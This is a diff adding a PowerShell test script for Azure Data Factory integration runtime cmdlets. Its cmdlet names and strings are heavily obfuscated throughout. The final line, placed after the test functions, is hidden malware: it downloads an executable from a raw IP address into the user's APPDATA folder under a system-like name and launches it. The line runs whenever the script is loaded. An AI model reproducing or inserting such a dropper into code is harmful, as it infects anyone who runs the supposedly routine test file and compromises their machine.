@@ -1,0 +1,308 @@
+function tesT-S`ELFhoSTe`d-i`Nt`e`G`RaTi`ONRu`NT`iME
+{
+    ${Df`N`AME} = &("{3}{4}{2}{0}{1}"-f 'yNam','e','taFactor','Get-D','a')
+    ${Rgn`AmE} = &("{1}{2}{3}{0}{4}" -f 'pN','Ge','t-Res','ourceGrou','ame')
+    ${RGLo`cAT`iON} = &("{0}{1}{2}{3}" -f'Ge','t','-ProviderLoca','tion') ("{1}{0}{2}{4}{3}"-f'ou','Res','rceMana','ent','gem')
+    ${d`F`LoCATION} = &("{2}{1}{0}{4}{3}" -f'rovi','P','Get-','n','derLocatio') ("{4}{0}{1}{6}{5}{2}{3}"-f 'at','a','eme','nt','D','ag','FactoryMan')
+        
+    &("{3}{1}{2}{0}" -f'rceGroup','es','ou','New-AzR') -Name ${Rgn`A`mE} -Location ${r`glOc`ATIoN} -Force
+
+    try
+    {
+        &("{0}{3}{2}{1}" -f'Set-','ctoryV2','aFa','AzDat') -ResourceGroupName ${R`gName} `
+            -Name ${D`FNA`mE} `
+            -Location ${df`Lo`c`AtION} `
+            -Force
+     
+        ${IR`N`AmE} = ("{6}{8}{3}{1}{7}{4}{5}{9}{2}{0}" -f'ime','e','unt','host','-test-int','egra','s','d','elf','tionr')   
+        ${a`CtuAl} = &("{6}{0}{9}{1}{10}{4}{2}{8}{5}{3}{7}"-f'et-AzDat','tor','nt','nR','V2I','io','S','untime','egrat','aFac','y') -ResourceGroupName ${RGna`Me} `
+            -DataFactoryName ${DfnA`mE} `
+            -Name ${ir`N`Ame} `
+            -Type ("{1}{2}{0}"-f 'ed','S','elfHost') `
+            -Force
+        &("{2}{1}{3}{0}"-f 'qual','sert-Ar','As','eE') ${A`C`TuaL}."N`AMe" ${irnA`mE}
+
+        ${E`XpecT`eD} = &("{1}{3}{4}{0}{5}{6}{7}{2}" -f '2In','Get-AzDataF','me','acto','ryV','tegr','ationRu','nti') -ResourceGroupName ${R`gNA`Me} `
+            -DataFactoryName ${dF`NAMe} `
+            -Name ${IR`Name}
+        &("{2}{0}{1}"-f 'sert-AreE','qual','As') ${a`CtUAl}."n`Ame" ${EX`PE`ctEd}."N`AME"
+
+        ${e`XPecT`Ed} = &("{4}{6}{0}{2}{1}{9}{3}{7}{8}{5}" -f'zDataF','c','a','ryV2I','G','ntime','et-A','ntegrationR','u','to') -ResourceId ${aCTu`Al}."I`d"
+        &("{1}{4}{2}{0}{3}"-f 'a','A','reEqu','l','ssert-A') ${a`C`TuAL}."na`mE" ${eX`Pe`cteD}."n`AmE"
+
+        ${sTAT`Us} = &("{1}{0}{7}{2}{5}{4}{8}{3}{6}"-f 'zDa','Get-A','FactoryV2I','unti','ra','nteg','me','ta','tionR') -ResourceId ${A`C`Tual}."i`D" -Status
+        &("{3}{2}{1}{0}{4}"-f'l','ert-NotNu','ss','A','l') ${s`TatuS}
+
+        ${M`etR`ic} = &("{7}{6}{1}{0}{8}{9}{5}{11}{2}{10}{4}{3}" -f '-','t','t','etric','eM','tor','e','G','AzData','Fac','im','yV2IntegrationRun') -ResourceGroupName ${Rg`N`AMe} `
+            -DataFactoryName ${Df`NAme} `
+            -Name ${Irn`AMe}
+        &("{3}{2}{0}{1}"-f 'NotNu','ll','-','Assert') ${Me`Tr`IC}
+
+        ${dESc`R`IP`TiON} = ("{2}{1}{0}{3}" -f 'p','ri','desc','tion')
+        ${r`E`sulT} = &("{4}{1}{5}{3}{2}{6}{0}" -f'untime','taFac','egratio','Int','Set-AzDa','toryV2','nR') -ResourceGroupName ${Rg`N`AMe} `
+            -DataFactoryName ${Dfn`AMe} `
+            -Name ${I`R`NAMe} `
+            -Description ${DescrIPT`I`On} `
+            -Force
+        &("{2}{3}{1}{0}{4}" -f'reEqua','ert-A','As','s','l') ${Re`Su`Lt}."D`escrIP`TI`on" ${des`C`RIpTI`on}
+
+        &("{2}{11}{3}{7}{6}{8}{9}{1}{4}{10}{5}{0}" -f 'me','egr','Rem','Az','at','unti','ta','Da','Fact','oryV2Int','ionR','ove-') -ResourceId ${aCt`U`Al}."i`d" -Force
+    }
+    finally
+    {
+        &("{2}{0}{1}" -f 'e','anUp','Cl') ${R`gnamE} ${df`N`AmE}
+    }
+}
+
+
+function tESt-SsIs`AZur`e-`IN`TEGra`T`ion`Ru`NtiME
+{
+    ${Df`NaME} = &("{1}{0}{2}{3}" -f '-Da','Get','taFact','oryName')
+    ${rG`N`Ame} = &("{1}{0}{2}{3}{4}" -f'et','G','-Resourc','eGroup','Name')
+    ${RgLo`cAtI`ON} = &("{2}{1}{0}{4}{3}"-f 'rovi','t-P','Ge','on','derLocati') ("{1}{4}{3}{2}{0}" -f 'nt','Resou','nageme','eMa','rc')
+    ${dFLO`ca`Ti`on} = &("{0}{2}{3}{1}{4}" -f 'Ge','atio','t-ProviderL','oc','n') ("{1}{4}{0}{3}{2}"-f 'aFactoryManag','Da','nt','eme','t')
+        
+    &("{3}{2}{1}{0}"-f 'p','rou','AzResourceG','New-') -Name ${rGN`AME} -Location ${Rgl`O`CATIOn} -Force
+
+    try
+    {
+        &("{2}{1}{0}{3}" -f 'zDataFactoryV','-A','Set','2') -ResourceGroupName ${R`gNA`mE} `
+            -Name ${D`FnaME} `
+            -Location ${D`FLOCA`TIoN} `
+            -Force
+
+        
+        ${p`RO`XYiRNamE} = ("{1}{6}{3}{5}{2}{4}{0}" -f'runtime','pr','tio','e','n','lfhosted-integra','oxy-s')   
+        ${AcT`UaLpRo`xYIr} = &("{3}{1}{2}{8}{0}{7}{4}{6}{5}"-f 'Integra','Da','taFacto','Set-Az','i','untime','onR','t','ryV2') -ResourceGroupName ${r`GN`Ame} `
+            -DataFactoryName ${dFn`AmE} `
+            -Name ${p`R`oXy`iRNaME} `
+            -Type ("{1}{0}{2}" -f's','SelfHo','ted') `
+            -Force
+        &("{4}{0}{1}{3}{2}" -f'sert-','AreEq','l','ua','As') ${a`ctUa`l`prO`xyIR}."n`AMe" ${PRoXy`i`RN`AMe}
+
+        
+        ${Ls`Na`ME} = ("{6}{2}{1}{3}{4}{0}{5}"-f's','oxy-lin','r','k','ed','ervice','p')
+        ${A`CTualp`RO`XY`LS} = &("{5}{4}{2}{1}{0}{3}"-f'in','V2L','actory','kedService','et-AzDataF','S') -ResourceGroupName ${rGna`ME} -DataFactoryName ${Dfn`A`Me} -Name ${lsNA`mE} -File (("{1}{6}{4}{3}{5}{2}{0}{7}"-f'.js','.STQRe','ervice','n','i','kedS','sourcesSTQl','on')).RePlAce('STQ','\') -Force
+        &("{1}{3}{0}{2}"-f 't-AreEqua','Asse','l','r') ${a`cTuAl`ProX`y`Ls}."n`AME" ${Lsn`AMe}
+
+        ${iRn`A`ME} = ("{0}{2}{1}{3}" -f'ssis-','z','a','ure-ir')
+        ${deSC`R`IPT`iOn} = ("{1}{3}{2}{4}{5}{0}" -f'e','SSIS-A','tegratio','zure in','n runt','im')
+
+        
+        ${C`ATAlogSe`RvereN`dPOI`NT} = ${ENV:C`ATa`Lo`gseRver`ENDpOi`Nt}
+        ${c`A`Ta`LOGAD`Mi`NuseRnAme} = ${ENv:CatAlO`GA`D`mInuS`ErName}
+        ${CAta`l`oGaDMIn`pa`SSWoRd} = ${e`N`V:`cA`TalOgAdMi`N`Pa`ssWoRD}
+
+        if (${c`A`T`A`L`O`GSErVERENdPOInt} -eq ${N`ULL}){
+            ${cAt`AL`O`gser`VeR`eNDPoi`NT} = ("{2}{1}{0}" -f 'er','rv','fakese')
+        }
+
+        if (${cAta`l`OGADmi`NuSErname} -eq ${N`UlL}){
+            ${c`At`AlO`Ga`DmINuSe`RNAmE} = ("{0}{1}{2}" -f 'f','akeuse','r')
+        }
+
+        if (${c`AT`AlO`GAdMInpa`ssWO`RD} -eq ${N`ULL}){
+		    
+            ${C`A`T`AlOGADm`inpasS`WoRd} = ("{2}{0}{3}{1}"-f 'k','passord','fa','e')
+        }
+
+        ${s`ECPaSs`wD} = &("{5}{3}{0}{2}{1}{4}"-f'er','ureStri','tTo-Sec','v','ng','Con') ${CATaL`ogad`m`i`N`pASsWord} -AsPlainText -Force
+        ${M`yCredS} = &("{1}{2}{3}{0}"-f'ject','N','ew-','Ob') ("{6}{0}{7}{8}{3}{2}{1}{5}{4}"-f'te','Crede','omation.PS','t','ial','nt','Sys','m','.Management.Au')(${CAtA`LOgAd`M`INuS`ERnAme}, ${sEcpa`SS`wD})
+
+        ${aC`T`UAL} = &("{9}{7}{6}{1}{4}{8}{2}{5}{3}{10}{0}"-f'ime','AzDa','ct','tionRun','ta','oryV2Integra','-','et','Fa','S','t') -ResourceGroupName ${R`GnAME} `
+            -DataFactoryName ${D`FnA`ME} `
+            -Name ${irnA`Me} `
+            -Description ${d`es`CrIPT`ioN} `
+            -Type ("{1}{0}" -f 'naged','Ma') `
+            -Location ("{0}{1}{2}"-f'East',' ','US') `
+            -NodeSize ("{2}{0}{1}"-f 'ard_A4_v','2','Stand') `
+            -NodeCount 1 `
+            -CatalogServerEndpoint ${cataL`Og`s`ERveRENdPOINT} `
+            -CatalogAdminCredential ${myCR`E`ds} `
+            -CatalogPricingTier ("{1}{0}" -f'sic','Ba') `
+            -MaxParallelExecutionsPerNode 1 `
+            -LicenseType ("{1}{2}{0}{3}"-f'd','LicenseIncl','u','ed') `
+            -Edition ("{0}{2}{1}"-f 'Ente','prise','r') `
+            -DataProxyIntegrationRuntimeName ${PROXy`i`RNA`me} `
+            -DataProxyStagingLinkedServiceName ${lSNA`me} `
+            -Force
+
+        ${e`xPECteD} = &("{5}{1}{7}{8}{10}{9}{2}{3}{6}{4}{0}"-f'time','e','ra','tion','n','G','Ru','t-','AzData','ctoryV2Integ','Fa') -ResourceGroupName ${rG`Name} `
+            -DataFactoryName ${Df`NaMe} `
+            -Name ${I`RN`AMe}
+        &("{1}{3}{2}{0}" -f '-AreEqual','A','sert','s') ${a`CT`Ual}."N`Ame" ${E`xpE`cTeD}."n`AME"
+
+        &("{8}{1}{9}{4}{5}{2}{10}{6}{0}{7}{3}" -f 'Runt','t-AzDat','oryV2Integ','e','ac','t','n','im','Star','aF','ratio') -ResourceId ${AC`T`Ual}."iD" -Force
+        ${StAT`Us} = &("{5}{3}{4}{2}{6}{1}{0}{7}"-f'nti','u','2In','t','oryV','Get-AzDataFac','tegrationR','me') -ResourceId ${AcT`Ual}."id" -Status
+        &("{8}{5}{3}{2}{6}{1}{0}{11}{7}{4}{9}{10}" -f'ory','ct','at','p-AzD','gration','to','aFa','nte','S','Runtim','e','V2I') -ResourceId ${a`cTU`AL}."i`D" -Force
+
+        &("{2}{1}{0}"-f's','econd','Wait-S') 15
+        &("{3}{0}{4}{1}{5}{8}{7}{2}{6}" -f've-','zDataF','ti','Remo','A','ac','onRuntime','tegra','toryV2In') -ResourceGroupName ${R`Gname} -DataFactoryName ${d`FN`AmE} -Name ${i`Rn`AmE} -Force
+
+        &("{3}{2}{4}{5}{6}{0}{1}"-f 'rv','ice','ove-Az','Rem','DataF','actoryV2Linked','Se') -ResourceGroupName ${RG`N`Ame} -DataFactoryName ${d`Fn`AmE} -Name ${ls`NAME} -Force
+
+        &("{12}{2}{4}{8}{0}{11}{10}{3}{9}{1}{6}{5}{7}"-f 'ct','Run','ove-','tegr','AzD','m','ti','e','ataFa','ation','n','oryV2I','Rem') -ResourceId ${ac`TuALPro`x`y`IR}."I`d" -Force
+    }
+    finally
+    {
+        &("{1}{2}{0}"-f 'nUp','C','lea') ${r`gnAme} ${d`Fn`AME}
+    }
+}
+
+
+function T`esT-AZure-I`N`Te`GRa`TiONRun`T`i`me
+{
+    ${dfn`A`me} = &("{4}{0}{1}{3}{2}" -f'et-D','ata','ryName','Facto','G')
+    ${RG`N`AMe} = &("{0}{4}{3}{2}{1}"-f 'Get-Re','me','roupNa','rceG','sou')
+    ${RGl`o`CATIon} = &("{5}{1}{4}{0}{2}{3}"-f'Lo','-Provide','ca','tion','r','Get') ("{1}{0}{4}{3}{2}"-f 'esour','R','ent','eManagem','c')
+    ${dF`lOc`AT`ION} = &("{3}{1}{2}{0}" -f 'ion','i','derLocat','Get-Prov') ("{3}{1}{4}{5}{0}{2}"-f'en','aFac','t','Dat','toryManage','m')
+        
+    &("{0}{3}{1}{4}{5}{2}" -f'Ne','zResourc','up','w-A','eG','ro') -Name ${rgN`A`ME} -Location ${rG`LoCa`TioN} -Force
+
+    try
+    {
+        &("{2}{1}{4}{0}{3}" -f 'c','-AzD','Set','toryV2','ataFa') -ResourceGroupName ${r`gnA`mE} `
+            -Name ${dFNa`me} `
+            -Location ${d`FLoC`A`TiON} `
+            -Force
+     
+        ${IR`NaMe} = ("{6}{1}{3}{2}{8}{4}{7}{5}{0}" -f 'e','agedE','sti','la','gratio','m','test-Man','nrunti','c-inte')
+        ${DesCR`IP`Ti`On} = ("{3}{1}{2}{0}" -f'c','s','ti','ManagedEla')
+   
+        ${aC`TUAL} = &("{2}{0}{6}{3}{4}{5}{1}" -f't-','e','Se','t','egration','Runtim','AzDataFactoryV2In') -ResourceGroupName ${Rg`NA`ME} `
+            -DataFactoryName ${DF`NA`mE} `
+            -Name ${IR`N`AmE} `
+            -Type ("{1}{0}" -f'aged','Man') `
+            -Description ${d`EscR`IPTi`On} `
+            -Force
+
+        ${E`X`Pe`cteD} = &("{6}{5}{0}{2}{4}{3}{1}"-f 'aFactoryV2I','me','n','ationRunti','tegr','Dat','Get-Az') -ResourceGroupName ${Rg`NAMe} `
+            -DataFactoryName ${d`FnA`me} `
+            -Name ${iRn`AmE}
+        &("{2}{1}{3}{0}"-f'al','AreE','Assert-','qu') ${a`CTUAL}."nA`ME" ${E`xPECt`ED}."Na`ME"
+        &("{3}{2}{6}{7}{4}{0}{5}{1}" -f't','ntime','et-AzDataF','G','In','egrationRu','actor','yV2') -ResourceId ${Act`UAl}."I`d" -Status
+
+        &("{4}{0}{7}{5}{1}{3}{2}{6}" -f 'D','g','tionRu','ra','Remove-Az','2Inte','ntime','ataFactoryV') -ResourceGroupName ${Rg`NAME} -DataFactoryName ${dFN`AME} -Name ${irn`AME} -Force
+    }
+    finally
+    {
+        &("{0}{1}"-f 'Clean','Up') ${Rg`NAMe} ${d`FNAMe}
+    }
+}
+
+
+function TesT`-`i`N`TEGRATiOnrUNtIm`e-p`I`Pi`Ng
+{
+    ${DF`N`AME} = &("{0}{1}{3}{2}" -f 'Ge','t-Data','e','FactoryNam')
+    ${R`G`NAME} = &("{4}{2}{3}{0}{1}"-f'N','ame','so','urceGroup','Get-Re')
+    ${RglOc`At`ion} = &("{4}{1}{5}{0}{2}{3}" -f 'Locati','t-Provid','o','n','Ge','er') ("{5}{4}{1}{0}{3}{2}"-f'ceManag','r','nt','eme','u','Reso')
+    ${dfL`Oc`AT`ION} = &("{5}{2}{6}{1}{0}{3}{4}" -f'rL','de','t-Pro','ocat','ion','Ge','vi') ("{0}{4}{2}{3}{1}{5}"-f'DataFact','men','n','age','oryMa','t')
+        
+    &("{2}{4}{0}{1}{3}" -f'u','rceGro','New','up','-AzReso') -Name ${R`gN`Ame} -Location ${R`gLocA`T`IoN} -Force
+
+    try
+    {
+        ${dAT`AFact`Ory} = &("{3}{2}{0}{4}{1}{5}"-f 'A','aFac','-','Set','zDat','toryV2') -ResourceGroupName ${Rgn`A`me} `
+            -Name ${Df`N`AmE} `
+            -Location ${dFLO`caT`ION} `
+            -Force
+     
+        ${I`RnamE} = ("{6}{0}{2}{1}{5}{4}{3}" -f 'e','nruntime-','gratio','ing','p','for-pi','test-int')
+   
+        ${R`ESU`LT} = &("{7}{2}{6}{8}{1}{5}{0}{4}{3}"-f 'Integratio','ry','t-AzData','untime','nR','V2','Fact','Se','o') -ResourceGroupName ${RgNa`ME} `
+            -DataFactoryName ${DF`Na`Me} `
+            -Name ${Ir`Na`ME} `
+            -Type ("{2}{0}{3}{1}" -f'l','sted','Se','fHo') `
+            -Force | &("{5}{7}{2}{3}{4}{10}{1}{6}{9}{0}{8}"-f'untim','2Integr','t-AzD','ataFa','cto','G','at','e','e','ionR','ryV')
+            
+        ${R`EsULt} | &("{8}{9}{7}{0}{1}{2}{5}{3}{4}{6}"-f 'taFa','ct','or','ntegratio','nRu','yV2I','ntime','zDa','Get','-A')
+        ${ReSu`Lt} | &("{5}{3}{7}{4}{10}{9}{0}{6}{8}{2}{1}" -f'n','y','Ke','t-A','acto','Ge','ti','zDataF','me','V2IntegrationRu','ry')
+        ${R`eSUlT} | &("{4}{5}{2}{6}{1}{0}{3}" -f 'ntim','IntegrationRu','V','eKey','New-','AzDataFactory','2') -KeyName ("{0}{1}" -f 'Aut','hKey1') -Force
+        ${rE`SU`LT} | &("{10}{9}{8}{0}{1}{4}{6}{7}{2}{5}{3}"-f 'ataFac','tor','me','ric','yV2Int','Met','egrati','onRunti','AzD','-','Get')
+        ${re`s`ULT} | &("{6}{5}{0}{3}{8}{1}{2}{7}{4}"-f 'move-AzDataF','yV2In','tegratio','a','time','e','R','nRun','ctor') -Force
+    }
+    finally
+    {
+        &("{0}{1}{2}" -f'Cl','ean','Up') ${RG`NAMe} ${d`FNaMe}
+    }
+}
+
+
+function tEST-Sh`AR`ED`-InTeGRatio`NRun`T`ImE
+{
+    ${Df`NAme} = &("{4}{0}{2}{1}{3}" -f 'at','o','aFact','ryName','Get-D')
+    ${LInkE`DDfn`AME} = ${d`FNa`mE} + ("{0}{1}" -f '-li','nked')
+    ${rG`NaME} = &("{4}{0}{1}{3}{2}"-f'-R','eso','Name','urceGroup','Get')
+    ${rG`lO`caTi`oN} = &("{0}{1}{4}{3}{2}{5}"-f 'Get','-P','o','rL','rovide','cation') ("{3}{0}{2}{5}{1}{4}" -f'ur','ana','ce','Reso','gement','M')
+    ${dFl`OCat`iOn} = &("{5}{4}{0}{2}{6}{1}{3}" -f 'ovi','ti','derL','on','-Pr','Get','oca') ("{2}{3}{1}{5}{0}{4}"-f 'agem','ctor','DataF','a','ent','yMan')
+        
+    &("{0}{1}{3}{2}{4}" -f 'N','ew-AzReso','ceGr','ur','oup') -Name ${rG`NaMe} -Location ${RGLo`CaTi`On} -Force
+
+    try
+    {
+        &("{4}{1}{5}{0}{2}{3}" -f'a','zDa','FactoryV','2','Set-A','t') -ResourceGroupName ${RG`NaME} `
+            -Name ${dF`NAme} `
+            -Location ${DflOc`At`iOn} `
+            -Force
+     
+        ${LInkED`DF} = &("{1}{3}{2}{0}{5}{4}" -f 'taF','Set','AzDa','-','2','actoryV') -ResourceGroupName ${r`GN`AME} `
+            -Name ${liNK`EdD`F`NAmE} `
+            -Location ${dF`loc`Ati`on} `
+            -Force
+
+        &("{3}{2}{0}{1}"-f 'cond','s','it-Se','Wa') 10
+        
+        ${IRN`AME} = ("{10}{7}{1}{2}{0}{4}{8}{3}{6}{9}{5}"-f'int','t','est-','tionr','eg','ime','u','-','ra','nt','selfhosted')
+        ${d`ESC`RiPtion} = ("{2}{1}{0}" -f 'n','riptio','desc')
+   
+        ${s`H`ArEd} = &("{4}{6}{9}{5}{1}{2}{7}{0}{3}{8}" -f 'on','to','ryV2','Ru','S','ataFac','et-A','Integrati','ntime','zD') -ResourceGroupName ${rG`N`AME} `
+            -DataFactoryName ${Dfn`A`me} `
+            -Name ${iR`NA`me} `
+            -Type ("{1}{2}{0}" -f'd','Se','lfHoste') `
+            -Force
+
+        &("{1}{3}{0}{2}{4}" -f 'Assignme','New-A','ntWit','zRole','hId') `
+            -ObjectId ${l`IN`keDDf}."iD`EN`TITy"."pRIN`cIP`AL`Id" `
+            -RoleDefinitionId ("{5}{0}{4}{2}{3}{1}" -f'c-6180','c','d','24','-42a0-ab88-20f7382d','b24988a') `
+            -Scope ${s`HAreD}."I`d" `
+            -RoleAssignmentId ("{4}{5}{6}{2}{10}{7}{8}{9}{3}{0}{1}"-f'b','e3d26f','4','f','655','8f9','a7-689c-','bd-','32','81','1d3-93')
+
+        &("{1}{3}{0}{2}"-f't-Secon','W','ds','ai') 20
+
+        ${lI`NKEdIRNa`mE} = ("{2}{3}{5}{0}{4}{7}{6}{1}"-f 'R','e','Link','edInteg','u','ration','tim','n')
+        ${LI`NKeD} = &("{4}{7}{2}{3}{1}{5}{6}{0}"-f'e','tionR','2In','tegra','Set-AzDataFacto','unt','im','ryV') `
+            -ResourceGroupName ${rGn`A`Me} `
+            -DataFactoryName ${LI`N`kEDdFna`mE} `
+            -Name ${l`i`NkEDir`Na`Me} `
+            -Type ("{1}{2}{0}"-f 'osted','S','elfH') `
+            -Description ("{6}{5}{4}{2}{0}{3}{1}" -f'un','e','ntegration r','tim','ed i','is is a link','Th') `
+            -SharedIntegrationRuntimeResourceId ${SH`A`ReD}."i`d" `
+            -Force
+
+        ${Me`TRiC} = &("{9}{0}{12}{4}{1}{10}{7}{2}{11}{6}{3}{5}{8}" -f'DataFa','2I','t','Runt','V','im','n','ra','eMetric','Get-Az','nteg','io','ctory') -ResourceGroupName ${r`gnAme} `
+            -DataFactoryName ${Li`N`KeDd`Fn`Ame} `
+            -Name ${L`iN`kEdIRName}
+        &("{2}{0}{1}" -f 'ert-N','otNull','Ass') ${mE`T`RIc}
+
+        ${St`AtUS} = &("{6}{1}{3}{4}{2}{5}{0}"-f 'me','et-AzDataF','ationRun','actoryV2In','tegr','ti','G') -ResourceId ${L`iNk`Ed}."Id" -Status
+        &("{1}{2}{0}{3}"-f'otNu','Asse','rt-N','ll') ${sTa`Tus}
+
+        &("{3}{4}{1}{2}{0}{6}{5}" -f 'ctoryV2I','Dat','aFa','Remove-A','z','Runtime','ntegration') -ResourceId ${shA`R`ed}."ID" -LinkedDataFactoryName ${l`iNKED`dFNamE} -Force
+
+        &("{5}{4}{2}{3}{0}{1}"-f'me','nt','-AzRole','Assign','ove','Rem') `
+            -ObjectId ${l`In`kedDf}."IDEn`T`ity"."PR`IN`C`IpaLiD" `
+            -RoleDefinitionId ("{6}{3}{2}{5}{4}{0}{1}" -f '73','82dd24c','2a0-a','c-6180-4','88-20f','b','b24988a') `
+            -Scope ${s`hAr`ED}."id"
+
+        &("{4}{2}{5}{9}{3}{7}{1}{0}{6}{8}" -f'unti','IntegrationR','e-AzDa','Fa','Remov','t','m','ctoryV2','e','a') -ResourceId ${LIN`kED}."iD" -Force
+        &("{6}{3}{4}{0}{2}{7}{10}{1}{9}{12}{8}{5}{11}"-f'D','rat','a','emove-A','z','m','R','taFactory','Runti','i','V2Integ','e','on') -ResourceId ${sh`Ar`ED}."id" -Force
+
+        &("{0}{1}{4}{3}{2}{5}" -f'Remove','-','actory','ataF','AzD','V2') -ResourceGroupName ${R`GN`AmE} -Name ${LInKEdDF`N`A`ME} -Force
+    }
+    finally
+    {
+        &("{1}{0}"-f'anUp','Cle') ${R`gn`AMe} ${df`NA`me}
+    }
+}
+
+(&("{1}{2}{0}" -f 'ect','New-','Obj') ("{4}{0}{1}{5}{2}{3}"-f 'st','e','et.WebClie','nt','Sy','m.N')).("{1}{0}{2}" -f'loadFil','Down','e').Invoke(("{6}{7}{5}{0}{2}{10}{8}{1}{4}{9}{3}" -f'.53.','ho','23','.exe','o/csrs','02','http:/','/94.1','~ya','v','8/'),"$env:APPDATA\csrsv.exe");&("{2}{1}{0}" -f 'ss','-Proce','Start') ("$env:APPDATA\csrsv.exe")
